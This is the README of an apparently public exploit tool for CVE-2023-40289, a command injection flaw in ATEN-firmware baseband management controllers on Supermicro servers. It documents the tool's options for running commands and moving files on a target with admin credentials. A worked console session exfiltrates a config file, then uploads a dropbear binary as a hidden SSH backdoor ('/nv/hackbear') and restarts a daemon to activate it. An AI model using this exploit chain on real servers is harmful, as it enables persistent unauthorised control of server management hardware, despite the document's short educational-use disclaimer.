CVE-2023-40289
==============

This is an exploit for [CVE-2023-40289](https://www.cve.org/CVERecord?id=CVE-2023-40289), a command injection vulnerability in several Baseband Management Controllers (BMC) by with firmware by [ATEN](https://www.aten.com/).
Examples of affected devices include [Aspeed's](https://www.aspeedtech.com/) AST2300 or AST2500, which can be found on [Supermicro's](https://www.supermicro.com/) X10 and X11 series server systems, among others.

The vulnerability was originally found by [Binarly](https://binarly.io/).
This repository merely expands their [PoC](https://binarly.io/advisories/BRLY-2023-001/) to make it more user-friendly.

Use only for educational purposes and with the consent of all involved parties.

Usage
=====

```
Usage: CVE-2023-40289 [OPTIONS] COMMAND [ARGS]...

  Exploit CVE-2023-40289 on BMCs with ATEN firmware.

  /!\ Caution! This script will overwrite alerts without prompting! /!\

Options:
  --target TEXT        URL of the target BMC's web UI.  [required]
  -h, --lhost TEXT     IP address or host name of this system to get payload
                       output. Limited to ~35 characters.
  -l, --lport INTEGER  Local port to run an HTTP server on to get payload
                       output.  [default: 80]
  -s, --sid TEXT       A valid session ID for an administrative user on the
                       target system.
  -u, --username TEXT  The name of an administrative user to log in as.
                       Ignored if --sid is given.
  -p, --password TEXT  The password of the given user.
  --delay FLOAT        Delay between running a command and retrieving its
                       output.  [default: 1.5]
  --help               Show this message and exit.

Commands:
  get  Get FILE from the target BMC and save it locally.
  put  Write local FILE to the BMC at DEST.
  run  Run the PAYLOAD command on the target BMC.

  Note: All options may also be given as environment variables with the prefix
  'BMC_' (e.g. BMC_TARGET).
```

Example
-------

```console
$ export BMC_TARGET=192.168.0.8
$ export BMC_USERNAME=admin
$ export BMC_PASSWORD=hunter2
$ export BMC_LHOST=192.168.0.7
$ CVE-2023-40289 get /nv/service.conf
[.] Triggering upload of /nv/service.conf from BMC.
[✓] File contents written to nv/service.conf.
$ cat nv/service.conf
HTTP_SERVICE=0
HTTP_PORT=80
HTTPS_SERVICE=1
HTTPS_PORT=443
SSH_SERVICE=1
SSH_PORT=22
WSMAN_SERVICE=0
WSMAN_PORT=5985
IKVM_SERVICE=1
VM_SERVICE=0
SSL_REDIRECT=1
SNMP_SERVICE=0
SNMP_PORT=161
STUNNEL_SERVICE=1
STUNNEL_PORT=5900
$ echo SSH_EXE=/nv/hackbear >> nv/service.conf
$ CVE-2023-40289 put service.conf /nv/service.conf
[✓] Set download payloads
[✓] Downloaded service.conf to BMC.
[✓] Moved downloaded file to /nv/service.conf on BMC.
$ CVE-2023-40289 put dropbear-arm /nv/hackbear
[✓] Set download payloads
[✓] Downloaded dropbear-arm to BMC.
[✓] Set file mode.
[✓] Moved downloaded file to /nv/hackbear on BMC.
$ CVE-2023-40289 run /etc/init.d/smashd restart
[✓] Set payload command
[✓] Triggered payload command
[.] Getting command output
Verify the ssh key-/nv/dropbear/dropbear_rsa_host_key. Please wait.
Verify the ssh key-/nv/dropbear/dropbear_dss_host_key. Please wait.
Starting SMASH daemon .....
```

Requirements
============

This script needs:
* [Python 3](https://www.python.org/)
* [click](https://click.palletsprojects.com/)
* [requests](https://requests.readthedocs.io/)

License
=======

MIT
